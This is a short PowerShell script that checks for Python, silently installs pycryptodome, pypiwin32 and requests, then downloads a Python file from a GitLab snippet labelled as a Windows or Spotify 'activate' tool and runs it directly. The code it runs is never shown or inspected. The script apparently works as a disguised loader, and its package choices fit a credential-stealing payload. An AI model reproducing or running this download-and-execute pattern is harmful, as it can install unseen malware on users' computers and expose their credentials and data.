# [1] Check for Python
try {
    $pythonCheck = python --version 2>&1
    if (-not $pythonCheck) { throw }
} catch {
    Write-Host "⚠️ Python not found. Download from: https://python.org"
    exit 1
}

# [2] Install ONLY these packages
$packages = "pycryptodome", "pypiwin32", "requests"
python -m pip install --upgrade pip --quiet
python -m pip install $packages --quiet --no-warn-script-location

# [3] Execute Python script directly from URL
$pythonScript = Invoke-RestMethod "https://gitlab.com/win_activate/ACTIVATE/-/snippets/4880892/raw/main/Spotify.py"
python -c $pythonScript
